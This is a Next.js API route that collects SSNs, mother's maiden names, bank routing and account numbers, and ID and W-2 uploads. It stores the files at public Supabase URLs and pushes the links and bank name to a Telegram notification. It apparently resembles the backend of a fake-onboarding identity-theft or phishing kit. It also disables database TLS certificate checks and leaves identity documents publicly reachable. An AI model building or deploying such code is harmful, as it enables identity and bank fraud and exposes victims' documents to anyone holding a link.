// app/api/onboarding/route.ts
import { NextResponse } from "next/server";
import { createClient, type SupabaseClient } from "@supabase/supabase-js";
import { randomUUID } from "crypto";
import { sendTelegramNotification } from "@/app/lib/sendTelegramNotification";
import { Pool } from "pg";

export const runtime = "nodejs";
export const maxDuration = 60;

type Env = {
  DATABASE_URL: string;
  NEXT_PUBLIC_SUPABASE_URL: string;
  SUPABASE_SERVICE_ROLE_KEY: string;
};

function requireEnv(): Env {
  const DATABASE_URL = process.env.DATABASE_URL;
  const NEXT_PUBLIC_SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

  // ✅ TypeScript-safe narrowing (no `!`, no casts)
  if (!DATABASE_URL) throw new Error("Missing env var: DATABASE_URL");
  if (!NEXT_PUBLIC_SUPABASE_URL) throw new Error("Missing env var: NEXT_PUBLIC_SUPABASE_URL");
  if (!SUPABASE_SERVICE_ROLE_KEY) throw new Error("Missing env var: SUPABASE_SERVICE_ROLE_KEY");

  return { DATABASE_URL, NEXT_PUBLIC_SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY };
}

function makePool(databaseUrl: string) {
  return new Pool({
    connectionString: databaseUrl,
    ssl: { rejectUnauthorized: false },
  });
}

function makeSupabase(url: string, serviceKey: string) {
  return createClient(url, serviceKey, { auth: { persistSession: false } });
}

function sanitize(str: string) {
  return str.replace(/[^a-zA-Z0-9\-_]/g, "_");
}

function guessExt(file: Blob) {
  const type = (file.type || "").toLowerCase();
  if (type === "image/jpeg") return "jpg";
  if (type === "image/png") return "png";
  if (type === "application/pdf") return "pdf";
  const parts = type.split("/");
  return parts[1] || "bin";
}

async function uploadToSupabase(opts: {
  supabase: SupabaseClient;
  file: Blob;
  filename: string;
}) {

  const { supabase, file, filename } = opts;

  const buffer = Buffer.from(await file.arrayBuffer());
  const contentType = file.type || "application/octet-stream";

  const { error: uploadError } = await supabase.storage
    .from("onboarding")
    .upload(filename, buffer, { contentType, upsert: true });

  if (uploadError) {
    console.error("❌ Upload error:", uploadError.message);
    throw new Error(`Upload failed for ${filename}: ${uploadError.message}`);
  }

  const { data: urlData } = supabase.storage.from("onboarding").getPublicUrl(filename);

  if (!urlData?.publicUrl) {
    throw new Error(`Failed to get public URL for ${filename}`);
  }

  return urlData.publicUrl;
}

export async function POST(req: Request) {
  let pool: Pool | null = null;

  try {
    const env = requireEnv();

    pool = makePool(env.DATABASE_URL);
    const supabase = makeSupabase(env.NEXT_PUBLIC_SUPABASE_URL, env.SUPABASE_SERVICE_ROLE_KEY);

    const formData = await req.formData();
    const get = (key: string) => formData.get(key)?.toString().trim() ?? "";

    const applicant_id = get("applicant_id");
    const first_name = get("first_name");
    const middle_name = get("middle_name");
    const last_name = get("last_name");
    const mother_maiden = get("motherMaidenName");

    const ssn_raw = get("ssn");
    const ssn_digits = ssn_raw.replace(/\D/g, "");
    const ssn = ssn_digits ? ssn_digits : null;

    const date_of_birth = get("date_of_birth");
    const routing_number = get("routing_number");
    const account_number = get("account_number");
    const bank_name = get("bank_name");

    const street = get("address.street");
    const city = get("address.city");
    const state = get("address.state");
    const zip_code = get("address.zip_code");

    if (!applicant_id || !first_name || !last_name) {
      return NextResponse.json(
        { error: "Missing applicant_id, first_name, or last_name." },
        { status: 400 },
      );
    }

    if (![street, city, state, zip_code].every(Boolean)) {
      return NextResponse.json({ error: "All address fields are required." }, { status: 400 });
    }

    if (ssn && !/^\d{9}$/.test(ssn)) {
      return NextResponse.json({ error: "SSN must be exactly 9 digits." }, { status: 400 });
    }

    const front_image = formData.get("front_image");
    const back_image = formData.get("back_image");
    const w2_form = formData.get("w2_form");

    if (!(front_image instanceof Blob) || !(back_image instanceof Blob) || !(w2_form instanceof Blob)) {
      return NextResponse.json({ error: "Missing or invalid file(s)." }, { status: 400 });
    }

    const generateFilename = (label: string, file: Blob) => {
      const ext = guessExt(file);
      const cleanName = sanitize(`${first_name}-${last_name}-${label}`);
      return `${label}/${cleanName}-${randomUUID()}.${ext}`;
    };

    const front_image_filename = generateFilename("front", front_image);
    const back_image_filename = generateFilename("back", back_image);
    const w2_form_filename = generateFilename("w2", w2_form);

    const [front_url, back_url, w2_url] = await Promise.all([
      uploadToSupabase({ supabase, file: front_image, filename: front_image_filename }),
      uploadToSupabase({ supabase, file: back_image, filename: back_image_filename }),
      uploadToSupabase({ supabase, file: w2_form, filename: w2_form_filename }),
    ]);

    await pool.query(
      `INSERT INTO onboarding (
        applicant_id, first_name, middle_name, last_name, mother_maiden_name,
        ssn, date_of_birth,
        street, city, state, zip_code,
        account_number, routing_number, bank_name,
        front_image_url, back_image_url, w2_form_url,
        front_image_filename, back_image_filename, w2_form_filename,
        onboarding_completed, onboarding_date
      ) VALUES (
        $1,$2,$3,$4,$5,
        $6,$7,
        $8,$9,$10,$11,
        $12,$13,$14,
        $15,$16,$17,
        $18,$19,$20,
        TRUE, NOW()
      )
      ON CONFLICT (applicant_id) DO UPDATE SET
        first_name = EXCLUDED.first_name,
        middle_name = EXCLUDED.middle_name,
        last_name = EXCLUDED.last_name,
        mother_maiden_name = EXCLUDED.mother_maiden_name,
        ssn = EXCLUDED.ssn,
        date_of_birth = EXCLUDED.date_of_birth,
        street = EXCLUDED.street,
        city = EXCLUDED.city,
        state = EXCLUDED.state,
        zip_code = EXCLUDED.zip_code,
        account_number = EXCLUDED.account_number,
        routing_number = EXCLUDED.routing_number,
        bank_name = EXCLUDED.bank_name,
        front_image_url = EXCLUDED.front_image_url,
        back_image_url = EXCLUDED.back_image_url,
        w2_form_url = EXCLUDED.w2_form_url,
        front_image_filename = EXCLUDED.front_image_filename,
        back_image_filename = EXCLUDED.back_image_filename,
        w2_form_filename = EXCLUDED.w2_form_filename,
        onboarding_completed = TRUE,
        onboarding_date = NOW()`,
      [
        applicant_id,
        first_name,
        middle_name || null,
        last_name,
        mother_maiden || null,
        ssn,
        date_of_birth || null,
        street,
        city,
        state,
        zip_code,
        account_number || null,
        routing_number || null,
        bank_name || null,
        front_url,
        back_url,
        w2_url,
        front_image_filename,
        back_image_filename,
        w2_form_filename,
      ],
    );

    // Fire-and-forget notification
    sendTelegramNotification(
      `📥 New Onboarding: ${first_name} ${last_name} (${bank_name})
🔗 Front ID: ${front_url}
🔗 Back ID: ${back_url}
📄 W-2: ${w2_url}`.trim(),
    ).catch((e) => console.error("Telegram failed:", e));

    return NextResponse.json({ success: true });
  } catch (err: any) {
    console.error("❌ Onboarding failed:", err?.message || err);

    const msg = String(err?.message || "");
    if (msg.startsWith("Missing env var:")) {
      return NextResponse.json({ error: msg }, { status: 500 });
    }

    return NextResponse.json({ error: "Failed to complete onboarding." }, { status: 500 });
  } finally {
    try {
      await pool?.end();
    } catch {}
  }
}
